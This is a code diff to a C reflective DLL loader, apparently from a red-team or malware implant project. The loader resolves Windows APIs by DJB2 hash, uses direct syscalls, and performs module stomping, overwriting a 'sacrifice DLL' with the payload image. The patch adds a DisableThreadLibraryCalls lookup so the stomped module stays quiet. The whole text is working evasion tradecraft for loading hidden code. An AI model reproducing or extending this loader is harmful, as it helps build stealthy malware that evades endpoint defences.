@@ -116,6 +116,7 @@ SLEXPORT ULONG_PTR WINAPI _DllInit(ULONG_PTR lpParam)
 {
     LOADLIBRARYA   pLoadLibraryA   = NULL;
     GETPROCADDRESS pGetProcAddress = NULL;
+    DISABLETHREADLIBRARYCALLS pDisableThreadLibraryCalls = NULL;
     PVOID          pNtdllBase      = NULL;
 
     /* Direct syscalls — own DJB2-hashed descriptors */
@@ -207,21 +208,24 @@ SLEXPORT ULONG_PTR WINAPI _DllInit(ULONG_PTR lpParam)
             nameArr = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfNames;
             ordArr  = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfNameOrdinals;
 
-            remaining = 2;
+            remaining = 3;
 
             while (remaining > 0)
             {
                 fnHash = djb2_fn((char *)(modBase + DEREF_32(nameArr)));
 
-                if (fnHash == FN_LOADLIBRARYA || fnHash == FN_GETPROCADDRESS)
+                if (fnHash == FN_LOADLIBRARYA || fnHash == FN_GETPROCADDRESS
+                    || fnHash == FN_DISABLETHREADLIBRARYCALLS)
                 {
                     funcArr = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfFunctions;
                     funcArr += DEREF_16(ordArr) * sizeof(DWORD);
 
                     if (fnHash == FN_LOADLIBRARYA)
                         pLoadLibraryA = (LOADLIBRARYA)(modBase + DEREF_32(funcArr));
-                    else
+                    else if (fnHash == FN_GETPROCADDRESS)
                         pGetProcAddress = (GETPROCADDRESS)(modBase + DEREF_32(funcArr));
+                    else
+                        pDisableThreadLibraryCalls = (DISABLETHREADLIBRARYCALLS)(modBase + DEREF_32(funcArr));
 
                     remaining--;
                 }
@@ -279,6 +283,12 @@ SLEXPORT ULONG_PTR WINAPI _DllInit(ULONG_PTR lpParam)
                                 ((PIMAGE_DOS_HEADER)hStomp)->e_lfanew;
             SIZE_T stompSize =
                 ((PIMAGE_NT_HEADERS)stNtHdr)->OptionalHeader.SizeOfImage;
+
+            /* Suppress DLL_THREAD_ATTACH / DLL_THREAD_DETACH
+             * for the sacrifice DLL before we overwrite its
+             * code pages with the main image. */
+            if (pDisableThreadLibraryCalls)
+                pDisableThreadLibraryCalls(hStomp);
 
             if (stompSize >= regionSize)
             {
